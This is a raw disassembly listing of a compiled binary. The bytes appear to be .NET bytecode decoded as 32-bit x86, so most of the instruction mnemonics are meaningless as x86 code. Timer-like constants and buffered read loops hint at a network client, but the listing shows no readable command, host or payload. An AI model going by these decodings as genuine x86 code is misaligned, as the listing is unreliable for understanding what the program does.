  40260d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402612:	0c 00                	or     $0x0,%al
  402614:	00 06                	add    %al,(%esi)
  402616:	d4 8d                	aam    $0x8d
  402618:	57                   	push   %edi
  402619:	00 00                	add    %al,(%eax)
  40261b:	01 28                	add    %ebp,(%eax)
  40261d:	0b 00                	or     (%eax),%eax
  40261f:	00 06                	add    %al,(%esi)
  402621:	16                   	push   %ss
  402622:	6a 28                	push   $0x28
  402624:	0f 00 00             	sldt   (%eax)
  402627:	06                   	push   %es
  402628:	28 80 00 00 06 28    	sub    %al,0x28060000(%eax)
  40262e:	1e                   	push   %ds
  40262f:	00 00                	add    %al,(%eax)
  402631:	06                   	push   %es
  402632:	14 fe                	adc    $0xfe,%al
  402634:	06                   	push   %es
  402635:	1f                   	pop    %ds
  402636:	00 00                	add    %al,(%eax)
  402638:	06                   	push   %es
  402639:	73 3a                	jae    0x402675
  40263b:	00 00                	add    %al,(%eax)
  40263d:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402640:	18 00                	sbb    %al,(%eax)
  402642:	00 0a                	add    %cl,(%edx)
  402644:	20 98 3a 00 00 20    	and    %bl,0x2000003a(%eax)
  40264a:	30 75 00             	xor    %dh,0x0(%ebp)
  40264d:	00 6f 19             	add    %ch,0x19(%edi)
  402650:	00 00                	add    %al,(%eax)
  402652:	0a 73 18             	or     0x18(%ebx),%dh
  402655:	00 00                	add    %al,(%eax)
  402657:	0a 20                	or     (%eax),%ah
  402659:	98                   	cwtl
  40265a:	3a 00                	cmp    (%eax),%al
  40265c:	00 20                	add    %ah,(%eax)
  40265e:	60                   	pusha
  40265f:	ea 00 00 6f 19 00 00 	ljmp   $0x0,$0x196f0000
  402666:	0a 73 3b             	or     0x3b(%ebx),%dh
  402669:	00 00                	add    %al,(%eax)
  40266b:	0a 28                	or     (%eax),%ch
  40266d:	11 00                	adc    %eax,(%eax)
  40266f:	00 06                	add    %al,(%esi)
  402671:	28 08                	sub    %cl,(%eax)
  402673:	00 00                	add    %al,(%eax)
  402675:	06                   	push   %es
  402676:	28 0a                	sub    %cl,(%edx)
  402678:	00 00                	add    %al,(%eax)
  40267a:	06                   	push   %es
  40267b:	28 0e                	sub    %cl,(%esi)
  40267d:	00 00                	add    %al,(%eax)
  40267f:	06                   	push   %es
  402680:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402686:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  40268d:	06                   	push   %es
  40268e:	73 3c                	jae    0x4026cc
  402690:	00 00                	add    %al,(%eax)
  402692:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402695:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  40269a:	2b 06                	sub    (%esi),%eax
  40269c:	16                   	push   %ss
  40269d:	28 13                	sub    %dl,(%ebx)
  40269f:	00 00                	add    %al,(%eax)
  4026a1:	06                   	push   %es
  4026a2:	de 09                	fimuls (%ecx)
  4026a4:	26 16                	es push %ss
  4026a6:	28 13                	sub    %dl,(%ebx)
  4026a8:	00 00                	add    %al,(%eax)
  4026aa:	06                   	push   %es
  4026ab:	de 00                	fiadds (%eax)
  4026ad:	2a 00                	sub    (%eax),%al
  4026af:	00 41 4c             	add    %al,0x4c(%ecx)
  4026b2:	00 00                	add    %al,(%eax)
  4026b4:	00 00                	add    %al,(%eax)
  4026b6:	00 00                	add    %al,(%eax)
  4026b8:	c4 00                	les    (%eax),%eax
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	20 00                	and    %al,(%eax)
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	e4 00                	in     $0x0,%al
  4026c2:	00 00                	add    %al,(%eax)
  4026c4:	03 00                	add    (%eax),%eax
  4026c6:	00 00                	add    %al,(%eax)
  4026c8:	0f 00 00             	sldt   (%eax)
  4026cb:	01 02                	add    %eax,(%edx)
  4026cd:	00 00                	add    %al,(%eax)
  4026cf:	00 0e                	add    %cl,(%esi)
  4026d1:	01 00                	add    %eax,(%eax)
  4026d3:	00 77 00             	add    %dh,0x0(%edi)
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	85 01                	test   %eax,(%ecx)
  4026da:	00 00                	add    %al,(%eax)
  4026dc:	0c 00                	or     $0x0,%al
	...
  4026ea:	00 00                	add    %al,(%eax)
  4026ec:	94                   	xchg   %eax,%esp
  4026ed:	02 00                	add    (%eax),%al
  4026ef:	00 94 02 00 00 09 00 	add    %dl,0x90000(%edx,%eax,1)
  4026f6:	00 00                	add    %al,(%eax)
  4026f8:	0f 00 00             	sldt   (%eax)
  4026fb:	01 2a                	add    %ebp,(%edx)
  4026fd:	02 28                	add    (%eax),%ch
  4026ff:	3e 00 00             	add    %al,%ds:(%eax)
  402702:	0a 16                	or     (%esi),%dl
  402704:	fe 03                	incb   (%ebx)
  402706:	2a 32                	sub    (%edx),%dh
  402708:	7e 0b                	jle    0x402715
  40270a:	00 00                	add    %al,(%eax)
  40270c:	04 03                	add    $0x3,%al
  40270e:	6f                   	outsl  %ds:(%esi),(%dx)
  40270f:	3f                   	aas
  402710:	00 00                	add    %al,(%eax)
  402712:	0a 2a                	or     (%edx),%ch
  402714:	1b 30                	sbb    (%eax),%esi
  402716:	02 00                	add    (%eax),%al
  402718:	46                   	inc    %esi
  402719:	00 00                	add    %al,(%eax)
  40271b:	00 00                	add    %al,(%eax)
  40271d:	00 00                	add    %al,(%eax)
  40271f:	00 28                	add    %ch,(%eax)
  402721:	15 00 00 06 25       	adc    $0x25060000,%eax
  402726:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  40272b:	28 40 00             	sub    %al,0x0(%eax)
  40272e:	00 0a                	add    %cl,(%edx)
  402730:	28 10                	sub    %dl,(%eax)
  402732:	00 00                	add    %al,(%eax)
  402734:	06                   	push   %es
  402735:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40273a:	05 28 40 00 00       	add    $0x4028,%eax
  40273f:	0a 28                	or     (%eax),%ch
  402741:	08 00                	or     %al,(%eax)
  402743:	00 06                	add    %al,(%esi)
  402745:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40274a:	05 28 41 00 00       	add    $0x4128,%eax
  40274f:	0a 28                	or     (%eax),%ch
  402751:	06                   	push   %es
  402752:	00 00                	add    %al,(%eax)
  402754:	06                   	push   %es
  402755:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40275a:	05 28 42 00 00       	add    $0x4228,%eax
  40275f:	0a de                	or     %dh,%bl
  402761:	03 26                	add    (%esi),%esp
  402763:	de 00                	fiadds (%eax)
  402765:	2a 00                	sub    (%eax),%al
  402767:	00 01                	add    %al,(%ecx)
  402769:	10 00                	adc    %al,(%eax)
  40276b:	00 00                	add    %al,(%eax)
  40276d:	00 00                	add    %al,(%eax)
  40276f:	00 42 42             	add    %al,0x42(%edx)
  402772:	00 03                	add    %al,(%ebx)
  402774:	0f 00 00             	sldt   (%eax)
  402777:	01 1b                	add    %ebx,(%ebx)
  402779:	30 06                	xor    %al,(%esi)
  40277b:	00 96 01 00 00 04    	add    %dl,0x4000001(%esi)
  402781:	00 00                	add    %al,(%eax)
  402783:	11 28                	adc    %ebp,(%eax)
  402785:	06                   	push   %es
  402786:	00 00                	add    %al,(%eax)
  402788:	06                   	push   %es
  402789:	6f                   	outsl  %ds:(%esi),(%dx)
  40278a:	2c 00                	sub    $0x0,%al
  40278c:	00 0a                	add    %cl,(%edx)
  40278e:	2c 07                	sub    $0x7,%al
  402790:	28 12                	sub    %dl,(%edx)
  402792:	00 00                	add    %al,(%eax)
  402794:	06                   	push   %es
  402795:	2d 0b 16 28 13       	sub    $0x1328160b,%eax
  40279a:	00 00                	add    %al,(%eax)
  40279c:	06                   	push   %es
  40279d:	dd 77 01             	fnsave 0x1(%edi)
  4027a0:	00 00                	add    %al,(%eax)
  4027a2:	28 08                	sub    %cl,(%eax)
  4027a4:	00 00                	add    %al,(%eax)
  4027a6:	06                   	push   %es
  4027a7:	02 6f 43             	add    0x43(%edi),%ch
  4027aa:	00 00                	add    %al,(%eax)
  4027ac:	0a 0a                	or     (%edx),%cl
  4027ae:	06                   	push   %es
  4027af:	16                   	push   %ss
  4027b0:	3e 53                	ds push %ebx
  4027b2:	01 00                	add    %eax,(%eax)
  4027b4:	00 28                	add    %ch,(%eax)
  4027b6:	0e                   	push   %cs
  4027b7:	00 00                	add    %al,(%eax)
  4027b9:	06                   	push   %es
  4027ba:	06                   	push   %es
  4027bb:	6a 58                	push   $0x58
  4027bd:	28 0f                	sub    %cl,(%edi)
  4027bf:	00 00                	add    %al,(%eax)
  4027c1:	06                   	push   %es
  4027c2:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4027c5:	00 06                	add    %al,(%esi)
  4027c7:	06                   	push   %es
  4027c8:	6a 59                	push   $0x59
  4027ca:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  4027d0:	0c 00                	or     $0x0,%al
  4027d2:	00 06                	add    %al,(%esi)
  4027d4:	3a f3                	cmp    %bl,%dh
  4027d6:	00 00                	add    %al,(%eax)
  4027d8:	00 28                	add    %ch,(%eax)
  4027da:	0a 00                	or     (%eax),%al
  4027dc:	00 06                	add    %al,(%esi)
  4027de:	16                   	push   %ss
  4027df:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4027e3:	0a 6a 28             	or     0x28(%edx),%ch
  4027e6:	0d 00 00 06 28       	or     $0x28060000,%eax
  4027eb:	0c 00                	or     $0x0,%al
  4027ed:	00 06                	add    %al,(%esi)
  4027ef:	16                   	push   %ss
  4027f0:	6a 3e                	push   $0x3e
  4027f2:	b6 00                	mov    $0x0,%dh
  4027f4:	00 00                	add    %al,(%eax)
  4027f6:	16                   	push   %ss
  4027f7:	6a 28                	push   $0x28
  4027f9:	0f 00 00             	sldt   (%eax)
  4027fc:	06                   	push   %es
  4027fd:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402800:	00 06                	add    %al,(%esi)
  402802:	d4 8d                	aam    $0x8d
  402804:	57                   	push   %edi
  402805:	00 00                	add    %al,(%eax)
  402807:	01 28                	add    %ebp,(%eax)
  402809:	0b 00                	or     (%eax),%eax
  40280b:	00 06                	add    %al,(%esi)
  40280d:	2b 59 28             	sub    0x28(%ecx),%ebx
  402810:	08 00                	or     %al,(%eax)
  402812:	00 06                	add    %al,(%esi)
  402814:	28 0a                	sub    %cl,(%edx)
  402816:	00 00                	add    %al,(%eax)
  402818:	06                   	push   %es
  402819:	28 0e                	sub    %cl,(%esi)
  40281b:	00 00                	add    %al,(%eax)
  40281d:	06                   	push   %es
  40281e:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402824:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  40282b:	07                   	pop    %es
  40282c:	16                   	push   %ss
  40282d:	30 0b                	xor    %cl,(%ebx)
  40282f:	16                   	push   %ss
  402830:	28 13                	sub    %dl,(%ebx)
  402832:	00 00                	add    %al,(%eax)
  402834:	06                   	push   %es
  402835:	dd df                	fstp   %st(7)
  402837:	00 00                	add    %al,(%eax)
  402839:	00 28                	add    %ch,(%eax)
  40283b:	0e                   	push   %cs
  40283c:	00 00                	add    %al,(%eax)
  40283e:	06                   	push   %es
  40283f:	07                   	pop    %es
  402840:	6a 58                	push   $0x58
  402842:	28 0f                	sub    %cl,(%edi)
  402844:	00 00                	add    %al,(%eax)
  402846:	06                   	push   %es
  402847:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40284a:	00 06                	add    %al,(%esi)
  40284c:	07                   	pop    %es
  40284d:	6a 59                	push   $0x59
  40284f:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402855:	0c 00                	or     $0x0,%al
  402857:	00 06                	add    %al,(%esi)
  402859:	16                   	push   %ss
  40285a:	6a 2f                	push   $0x2f
  40285c:	0b 16                	or     (%esi),%edx
  40285e:	28 13                	sub    %dl,(%ebx)
  402860:	00 00                	add    %al,(%eax)
  402862:	06                   	push   %es
  402863:	dd b1 00 00 00 28    	fnsave 0x28000000(%ecx)
  402869:	0c 00                	or     $0x0,%al
  40286b:	00 06                	add    %al,(%esi)
  40286d:	16                   	push   %ss
  40286e:	6a 30                	push   $0x30
  402870:	9e                   	sahf
  402871:	14 fe                	adc    $0xfe,%al
  402873:	06                   	push   %es
  402874:	92                   	xchg   %eax,%edx
  402875:	00 00                	add    %al,(%eax)
  402877:	06                   	push   %es
  402878:	73 46                	jae    0x4028c0
  40287a:	00 00                	add    %al,(%eax)
  40287c:	0a 73 47             	or     0x47(%ebx),%dh
  40287f:	00 00                	add    %al,(%eax)
  402881:	0a 28                	or     (%eax),%ch
  402883:	0a 00                	or     (%eax),%al
  402885:	00 06                	add    %al,(%esi)
  402887:	6f                   	outsl  %ds:(%esi),(%dx)
  402888:	48                   	dec    %eax
  402889:	00 00                	add    %al,(%eax)
  40288b:	0a 16                	or     (%esi),%dl
  40288d:	6a 28                	push   $0x28
  40288f:	0f 00 00             	sldt   (%eax)
  402892:	06                   	push   %es
  402893:	1a 6a 28             	sbb    0x28(%edx),%ch
  402896:	0d 00 00 06 28       	or     $0x28060000,%eax
  40289b:	0c 00                	or     $0x0,%al
  40289d:	00 06                	add    %al,(%esi)
  40289f:	d4 8d                	aam    $0x8d
  4028a1:	57                   	push   %edi
  4028a2:	00 00                	add    %al,(%eax)
  4028a4:	01 28                	add    %ebp,(%eax)
  4028a6:	0b 00                	or     (%eax),%eax
  4028a8:	00 06                	add    %al,(%esi)
  4028aa:	2b 31                	sub    (%ecx),%esi
  4028ac:	1a 6a 28             	sbb    0x28(%edx),%ch
  4028af:	0d 00 00 06 28       	or     $0x28060000,%eax
  4028b4:	0c 00                	or     $0x0,%al
  4028b6:	00 06                	add    %al,(%esi)
  4028b8:	d4 8d                	aam    $0x8d
  4028ba:	57                   	push   %edi
  4028bb:	00 00                	add    %al,(%eax)
  4028bd:	01 28                	add    %ebp,(%eax)
  4028bf:	0b 00                	or     (%eax),%eax
  4028c1:	00 06                	add    %al,(%esi)
  4028c3:	16                   	push   %ss
  4028c4:	6a 28                	push   $0x28
  4028c6:	0f 00 00             	sldt   (%eax)
  4028c9:	06                   	push   %es
  4028ca:	2b 11                	sub    (%ecx),%edx
  4028cc:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4028cf:	00 06                	add    %al,(%esi)
  4028d1:	16                   	push   %ss
  4028d2:	6a 2f                	push   $0x2f
  4028d4:	08 16                	or     %dl,(%esi)
  4028d6:	28 13                	sub    %dl,(%ebx)
  4028d8:	00 00                	add    %al,(%eax)
  4028da:	06                   	push   %es
  4028db:	de 3c 28             	fidivrs (%eax,%ebp,1)
  4028de:	08 00                	or     %al,(%eax)
  4028e0:	00 06                	add    %al,(%esi)
  4028e2:	28 0a                	sub    %cl,(%edx)
  4028e4:	00 00                	add    %al,(%eax)
  4028e6:	06                   	push   %es
  4028e7:	28 0e                	sub    %cl,(%esi)
  4028e9:	00 00                	add    %al,(%eax)
  4028eb:	06                   	push   %es
  4028ec:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  4028f2:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  4028f9:	06                   	push   %es
  4028fa:	73 3c                	jae    0x402938
  4028fc:	00 00                	add    %al,(%eax)
  4028fe:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402901:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402906:	2b 06                	sub    (%esi),%eax
  402908:	16                   	push   %ss
  402909:	28 13                	sub    %dl,(%ebx)
  40290b:	00 00                	add    %al,(%eax)
  40290d:	06                   	push   %es
  40290e:	de 09                	fimuls (%ecx)
  402910:	26 16                	es push %ss
  402912:	28 13                	sub    %dl,(%ebx)
  402914:	00 00                	add    %al,(%eax)
  402916:	06                   	push   %es
  402917:	de 00                	fiadds (%eax)
  402919:	2a 00                	sub    (%eax),%al
  40291b:	00 41 1c             	add    %al,0x1c(%ecx)
	...
  402926:	00 00                	add    %al,(%eax)
  402928:	8c 01                	mov    %es,(%ecx)
  40292a:	00 00                	add    %al,(%eax)
  40292c:	8c 01                	mov    %es,(%ecx)
  40292e:	00 00                	add    %al,(%eax)
  402930:	09 00                	or     %eax,(%eax)
  402932:	00 00                	add    %al,(%eax)
  402934:	0f 00 00             	sldt   (%eax)
  402937:	01 1b                	add    %ebx,(%ebx)
  402939:	30 04 00             	xor    %al,(%eax,%eax,1)
  40293c:	e5 00                	in     $0x0,%eax
  40293e:	00 00                	add    %al,(%eax)
  402940:	05 00 00 11 28       	add    $0x28110000,%eax
  402945:	14 00                	adc    $0x0,%al
  402947:	00 06                	add    %al,(%esi)
  402949:	0a 16                	or     (%esi),%dl
  40294b:	0b 06                	or     (%esi),%eax
  40294d:	12 01                	adc    (%ecx),%al
  40294f:	28 49 00             	sub    %cl,0x0(%ecx)
  402952:	00 0a                	add    %cl,(%edx)
  402954:	28 12                	sub    %dl,(%edx)
  402956:	00 00                	add    %al,(%eax)
  402958:	06                   	push   %es
  402959:	2c 03                	sub    $0x3,%al
  40295b:	02 2d 05 dd c5 00    	add    0xc5dd05,%ch
  402961:	00 00                	add    %al,(%eax)
  402963:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402969:	00 0a                	add    %cl,(%edx)
  40296b:	0c 28                	or     $0x28,%al
  40296d:	06                   	push   %es
  40296e:	00 00                	add    %al,(%eax)
  402970:	06                   	push   %es
  402971:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402976:	00 0a                	add    %cl,(%edx)
  402978:	26 28 08             	sub    %cl,%es:(%eax)
  40297b:	00 00                	add    %al,(%eax)
  40297d:	06                   	push   %es
  40297e:	08 16                	or     %dl,(%esi)
  402980:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402986:	00 0a                	add    %cl,(%edx)
  402988:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  40298e:	0f 00                	(bad)
  402990:	31 5b 02             	xor    %ebx,0x2(%ebx)
  402993:	73 4d                	jae    0x4029e2
  402995:	00 00                	add    %al,(%eax)
  402997:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  40299d:	16                   	push   %ss
  40299e:	6a 6f                	push   $0x6f
  4029a0:	4e                   	dec    %esi
  4029a1:	00 00                	add    %al,(%eax)
  4029a3:	0a 20                	or     (%eax),%ah
  4029a5:	50                   	push   %eax
  4029a6:	c3                   	ret
  4029a7:	00 00                	add    %al,(%eax)
  4029a9:	8d 57 00             	lea    0x0(%edi),%edx
  4029ac:	00 01                	add    %al,(%ecx)
  4029ae:	13 05 2b 1c 28 06    	adc    0x6281c2b,%eax
  4029b4:	00 00                	add    %al,(%eax)
  4029b6:	06                   	push   %es
  4029b7:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  4029bc:	00 0a                	add    %cl,(%edx)
  4029be:	26 28 08             	sub    %cl,%es:(%eax)
  4029c1:	00 00                	add    %al,(%eax)
  4029c3:	06                   	push   %es
  4029c4:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  4029ca:	4c                   	dec    %esp
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	0a 09                	or     (%ecx),%cl
  4029cf:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  4029d5:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  4029dc:	13 04 16             	adc    (%esi,%edx,1),%eax
  4029df:	30 d1                	xor    %dl,%cl
  4029e1:	de 30                	fidivs (%eax)
  4029e3:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  4029e6:	09 6f 33             	or     %ebp,0x33(%edi)
  4029e9:	00 00                	add    %al,(%eax)
  4029eb:	0a dc                	or     %ah,%bl
  4029ed:	28 06                	sub    %al,(%esi)
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	06                   	push   %es
  4029f2:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  4029f7:	00 0a                	add    %cl,(%edx)
  4029f9:	26 28 08             	sub    %cl,%es:(%eax)
  4029fc:	00 00                	add    %al,(%eax)
  4029fe:	06                   	push   %es
  4029ff:	02 16                	add    (%esi),%dl
  402a01:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  402a07:	00 0a                	add    %cl,(%edx)
  402a09:	28 08                	sub    %cl,(%eax)
  402a0b:	00 00                	add    %al,(%eax)
  402a0d:	06                   	push   %es
  402a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a0f:	4f                   	dec    %edi
  402a10:	00 00                	add    %al,(%eax)
  402a12:	0a de                	or     %dh,%bl
  402a14:	13 26                	adc    (%esi),%esp
  402a16:	16                   	push   %ss
  402a17:	28 13                	sub    %dl,(%ebx)
  402a19:	00 00                	add    %al,(%eax)
  402a1b:	06                   	push   %es
  402a1c:	de 0a                	fimuls (%edx)
  402a1e:	07                   	pop    %es
  402a1f:	2c 06                	sub    $0x6,%al
  402a21:	06                   	push   %es
  402a22:	28 50 00             	sub    %dl,0x0(%eax)
  402a25:	00 0a                	add    %cl,(%edx)
  402a27:	dc 2a                	fsubrl (%edx)
  402a29:	00 00                	add    %al,(%eax)
  402a2b:	00 01                	add    %al,(%ecx)
  402a2d:	28 00                	sub    %al,(%eax)
  402a2f:	00 02                	add    %al,(%edx)
  402a31:	00 55 00             	add    %dl,0x0(%ebp)
  402a34:	4a                   	dec    %edx
  402a35:	9f                   	lahf
  402a36:	00 0a                	add    %cl,(%edx)
  402a38:	00 00                	add    %al,(%eax)
  402a3a:	00 00                	add    %al,(%eax)
  402a3c:	00 00                	add    %al,(%eax)
  402a3e:	10 00                	adc    %al,(%eax)
  402a40:	c1 d1 00             	rcl    $0x0,%ecx
  402a43:	09 0f                	or     %ecx,(%edi)
  402a45:	00 00                	add    %al,(%eax)
  402a47:	01 02                	add    %eax,(%edx)
  402a49:	00 08                	add    %cl,(%eax)
  402a4b:	00 d2                	add    %dl,%dl
  402a4d:	da 00                	fiaddl (%eax)
  402a4f:	0a 00                	or     (%eax),%al
  402a51:	00 00                	add    %al,(%eax)
  402a53:	00 13                	add    %dl,(%ebx)
  402a55:	30 05 00 86 00 00    	xor    %al,0x8600
  402a5b:	00 00                	add    %al,(%eax)
  402a5d:	00 00                	add    %al,(%eax)
  402a5f:	00 73 62             	add    %dh,0x62(%ebx)
  402a62:	00 00                	add    %al,(%eax)
  402a64:	06                   	push   %es
  402a65:	25 72 21 01 00       	and    $0x12172,%eax
  402a6a:	70 6f                	jo     0x402adb
  402a6c:	4d                   	dec    %ebp
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	06                   	push   %es
  402a70:	72 2f                	jb     0x402aa1
  402a72:	01 00                	add    %eax,(%eax)
  402a74:	70 6f                	jo     0x402ae5
  402a76:	5a                   	pop    %edx
  402a77:	00 00                	add    %al,(%eax)
  402a79:	06                   	push   %es
  402a7a:	25 72 39 01 00       	and    $0x13972,%eax
  402a7f:	70 6f                	jo     0x402af0
  402a81:	4d                   	dec    %ebp
  402a82:	00 00                	add    %al,(%eax)
  402a84:	06                   	push   %es
  402a85:	72 49                	jb     0x402ad0
  402a87:	01 00                	add    %eax,(%eax)
  402a89:	70 7e                	jo     0x402b09
  402a8b:	10 00                	adc    %al,(%eax)
  402a8d:	00 04 28             	add    %al,(%eax,%ebp,1)
  402a90:	8e 00                	mov    (%eax),%es
  402a92:	00 06                	add    %al,(%esi)
  402a94:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402a99:	57                   	push   %edi
  402a9a:	01 00                	add    %eax,(%eax)
  402a9c:	70 28                	jo     0x402ac6
  402a9e:	51                   	push   %ecx
  402a9f:	00 00                	add    %al,(%eax)
  402aa1:	0a 6f 5a             	or     0x5a(%edi),%ch
  402aa4:	00 00                	add    %al,(%eax)
  402aa6:	06                   	push   %es
  402aa7:	6f                   	outsl  %ds:(%esi),(%dx)
  402aa8:	57                   	push   %edi
  402aa9:	00 00                	add    %al,(%eax)
  402aab:	06                   	push   %es
  402aac:	28 1e                	sub    %bl,(%esi)
  402aae:	00 00                	add    %al,(%eax)
  402ab0:	06                   	push   %es
  402ab1:	28 15 00 00 06 25    	sub    %dl,0x25060000
  402ab7:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402abc:	28 40 00             	sub    %al,0x0(%eax)
  402abf:	00 0a                	add    %cl,(%edx)
  402ac1:	16                   	push   %ss
  402ac2:	28 18                	sub    %bl,(%eax)
  402ac4:	00 00                	add    %al,(%eax)
  402ac6:	06                   	push   %es
  402ac7:	14 fe                	adc    $0xfe,%al
  402ac9:	06                   	push   %es
  402aca:	20 00                	and    %al,(%eax)
  402acc:	00 06                	add    %al,(%esi)
  402ace:	73 3a                	jae    0x402b0a
  402ad0:	00 00                	add    %al,(%eax)
  402ad2:	0a 14 17             	or     (%edi,%edx,1),%dl
  402ad5:	17                   	pop    %ss
  402ad6:	73 3b                	jae    0x402b13
  402ad8:	00 00                	add    %al,(%eax)
  402ada:	0a 28                	or     (%eax),%ch
  402adc:	16                   	push   %ss
  402add:	00 00                	add    %al,(%eax)
  402adf:	06                   	push   %es
  402ae0:	28 52 00             	sub    %dl,0x0(%edx)
  402ae3:	00 0a                	add    %cl,(%edx)
  402ae5:	2a 36                	sub    (%esi),%dh
  402ae7:	28 17                	sub    %dl,(%edi)
  402ae9:	00 00                	add    %al,(%eax)
  402aeb:	06                   	push   %es
  402aec:	17                   	pop    %ss
  402aed:	58                   	pop    %eax
  402aee:	28 18                	sub    %bl,(%eax)
  402af0:	00 00                	add    %al,(%eax)
  402af2:	06                   	push   %es
  402af3:	2a 2e                	sub    (%esi),%ch
  402af5:	73 1a                	jae    0x402b11
  402af7:	00 00                	add    %al,(%eax)
  402af9:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  402aff:	2a 32                	sub    (%edx),%dh
  402b01:	7e 1c                	jle    0x402b1f
  402b03:	00 00                	add    %al,(%eax)
  402b05:	04 02                	add    $0x2,%al
  402b07:	6f                   	outsl  %ds:(%esi),(%dx)
  402b08:	21 00                	and    %eax,(%eax)
  402b0a:	00 0a                	add    %cl,(%edx)
  402b0c:	2a 32                	sub    (%edx),%dh
  402b0e:	7e 1c                	jle    0x402b2c
  402b10:	00 00                	add    %al,(%eax)
  402b12:	04 02                	add    $0x2,%al
  402b14:	6f                   	outsl  %ds:(%esi),(%dx)
  402b15:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402b1a:	00 00                	add    %al,(%eax)
  402b1c:	13 30                	adc    (%eax),%esi
  402b1e:	03 00                	add    (%eax),%eax
  402b20:	38 00                	cmp    %al,(%eax)
  402b22:	00 00                	add    %al,(%eax)
  402b24:	06                   	push   %es
  402b25:	00 00                	add    %al,(%eax)
  402b27:	11 73 53             	adc    %esi,0x53(%ebx)
  402b2a:	00 00                	add    %al,(%eax)
  402b2c:	0a 0a                	or     (%edx),%cl
  402b2e:	02 0b                	add    (%ebx),%cl
  402b30:	16                   	push   %ss
  402b31:	0c 2b                	or     $0x2b,%al
  402b33:	1f                   	pop    %ds
  402b34:	07                   	pop    %es
  402b35:	08 91 0d 06 72 5b    	or     %dl,0x5b72060d(%ecx)
  402b3b:	01 00                	add    %eax,(%eax)
  402b3d:	70 09                	jo     0x402b48
  402b3f:	8c 57 00             	mov    %ss,0x0(%edi)
  402b42:	00 01                	add    %al,(%ecx)
  402b44:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  402b48:	0a 6f 55             	or     0x55(%edi),%ch
  402b4b:	00 00                	add    %al,(%eax)
  402b4d:	0a 26                	or     (%esi),%ah
  402b4f:	08 17                	or     %dl,(%edi)
  402b51:	58                   	pop    %eax
  402b52:	0c 08                	or     $0x8,%al
  402b54:	07                   	pop    %es
  402b55:	8e 69 32             	mov    0x32(%ecx),%gs
  402b58:	db 06                	fildl  (%esi)
  402b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b5b:	38 00                	cmp    %al,(%eax)
  402b5d:	00 0a                	add    %cl,(%edx)
  402b5f:	2a 13                	sub    (%ebx),%dl
  402b61:	30 03                	xor    %al,(%ebx)
  402b63:	00 38                	add    %bh,(%eax)
  402b65:	00 00                	add    %al,(%eax)
  402b67:	00 06                	add    %al,(%esi)
  402b69:	00 00                	add    %al,(%eax)
  402b6b:	11 73 53             	adc    %esi,0x53(%ebx)
  402b6e:	00 00                	add    %al,(%eax)
  402b70:	0a 0a                	or     (%edx),%cl
  402b72:	02 0b                	add    (%ebx),%cl
  402b74:	16                   	push   %ss
  402b75:	0c 2b                	or     $0x2b,%al
  402b77:	1f                   	pop    %ds
  402b78:	07                   	pop    %es
  402b79:	08 91 0d 06 72 6b    	or     %dl,0x6b72060d(%ecx)
  402b7f:	01 00                	add    %eax,(%eax)
  402b81:	70 09                	jo     0x402b8c
  402b83:	8c 57 00             	mov    %ss,0x0(%edi)
  402b86:	00 01                	add    %al,(%ecx)
  402b88:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  402b8c:	0a 6f 55             	or     0x55(%edi),%ch
  402b8f:	00 00                	add    %al,(%eax)
  402b91:	0a 26                	or     (%esi),%ah
  402b93:	08 17                	or     %dl,(%edi)
  402b95:	58                   	pop    %eax
  402b96:	0c 08                	or     $0x8,%al
  402b98:	07                   	pop    %es
  402b99:	8e 69 32             	mov    0x32(%ecx),%gs
  402b9c:	db 06                	fildl  (%esi)
  402b9e:	6f                   	outsl  %ds:(%esi),(%dx)
  402b9f:	38 00                	cmp    %al,(%eax)
  402ba1:	00 0a                	add    %cl,(%edx)
  402ba3:	2a 13                	sub    (%ebx),%dl
  402ba5:	30 04 00             	xor    %al,(%eax,%eax,1)
